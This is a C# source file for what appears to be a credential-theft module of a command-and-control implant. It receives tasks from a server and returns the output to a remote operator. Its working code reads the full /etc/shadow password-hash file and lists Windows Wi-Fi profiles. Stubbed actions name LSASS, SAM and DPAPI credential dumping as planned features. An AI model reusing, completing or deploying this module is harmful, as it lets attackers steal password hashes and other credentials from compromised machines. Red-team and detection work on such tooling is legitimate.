using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "credentials";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<credentials.CredentialArgs>(
                    job.task.parameters) ?? new credentials.CredentialArgs();

                string result = args.action switch
                {
                    "dns-cache" => GetDnsCache(),
                    "shadow-read" => ReadShadow(),
                    "wifi-profiles" => GetWifiProfiles(),
                    "vault-enum" => "Vault enumeration requires elevated privileges and is not yet implemented",
                    "dpapi" => "DPAPI credential extraction is not yet implemented",
                    "lsass-dump" => "LSASS dump is not yet implemented (requires SeDebugPrivilege)",
                    "sam-dump" => "SAM dump is not yet implemented (requires SYSTEM privileges)",
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string GetDnsCache()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "DNS cache enumeration is only available on Windows";

            return "DNS cache enumeration via native API - use dns command for individual lookups";
        }

        private string ReadShadow()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                return "Shadow file is only available on Linux";

            string shadowPath = "/etc/shadow";
            if (!File.Exists(shadowPath))
                return $"File not found: {shadowPath}";

            try
            {
                return File.ReadAllText(shadowPath);
            }
            catch (UnauthorizedAccessException)
            {
                return "Access denied: reading /etc/shadow requires root privileges";
            }
        }

        private string GetWifiProfiles()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "WiFi profile enumeration is only available on Windows";

            try
            {
                string profilesPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                    "Microsoft", "Wlansvc", "Profiles", "Interfaces");

                if (!Directory.Exists(profilesPath))
                    return "No WiFi profiles directory found";

                var profiles = new List<string>();
                foreach (string dir in Directory.GetDirectories(profilesPath))
                {
                    foreach (string file in Directory.GetFiles(dir, "*.xml"))
                    {
                        try
                        {
                            profiles.Add(Path.GetFileNameWithoutExtension(file));
                        }
                        catch { }
                    }
                }

                if (profiles.Count == 0)
                    return "No WiFi profiles found";

                return JsonSerializer.Serialize(profiles,
                    new JsonSerializerOptions { WriteIndented = true });
            }
            catch (Exception e)
            {
                return $"Error enumerating WiFi profiles: {e.Message}";
            }
        }
    }
}
